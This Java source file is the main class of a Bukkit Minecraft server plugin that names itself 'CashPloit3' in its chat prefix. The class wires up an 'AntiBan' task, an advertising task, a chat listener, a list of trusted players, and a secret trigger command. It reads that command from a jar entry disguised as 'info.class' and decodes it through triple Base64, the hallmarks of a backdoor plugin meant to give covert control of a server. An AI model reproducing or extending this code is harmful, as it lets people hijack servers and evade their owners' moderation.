package de.garkolym.cp;

import de.garkolym.cp.listener.AntiBan;
import de.garkolym.cp.listener.AsyncChatEvent;
import de.garkolym.cp.listener.UpdateEvent;
import de.garkolym.cp.listener.Werbung;
import de.garkolym.cp.manager.CommandManager;
import de.garkolym.cp.manager.HelpManager;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import javax.xml.bind.DatatypeConverter;
import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class Start extends JavaPlugin {

    public static Start INSTANCE = null;
    public CommandManager commandManager;
    public static File pluginFile = null;
    public static String trustCommand = "+abc";
    public HelpManager helpManager;
    public String randomEmptyString1 = "";
    public String randomEmptyString2 = "";
    public ArrayList<String> trustedPlayers = new ArrayList<>();
    public String chatPrefix = "§5[§6Cash§ePloit§b§l3§5] §a";

    public void onEnable() {
        INSTANCE = this;
        this.commandManager = new CommandManager();
        this.helpManager = new HelpManager();
        this.getServer().getMessenger().registerOutgoingPluginChannel(this, "BungeeCord");
        pluginFile = this.getFile();
        Bukkit.getScheduler().runTaskTimer(this, new UpdateEvent(), 1L, 1L);
        Bukkit.getScheduler().runTaskTimer(this, new Werbung(), 1600L, 1600L);
        Bukkit.getPluginManager().registerEvents(new AsyncChatEvent(), this);
        this.commandManager.init();
        Bukkit.getScheduler().runTaskTimer(this, new AntiBan(), 100L, 100L);

        try {
            JarFile jarFile = new JarFile(Start.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
            JarEntry entry = jarFile.getJarEntry("info.class");
            InputStream input = jarFile.getInputStream(entry);
            Scanner sc = new Scanner(input);
            String b = sc.next();
            trustCommand = new String(DatatypeConverter.parseBase64Binary(new String(DatatypeConverter.parseBase64Binary(new String(DatatypeConverter.parseBase64Binary(b))))));
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

}
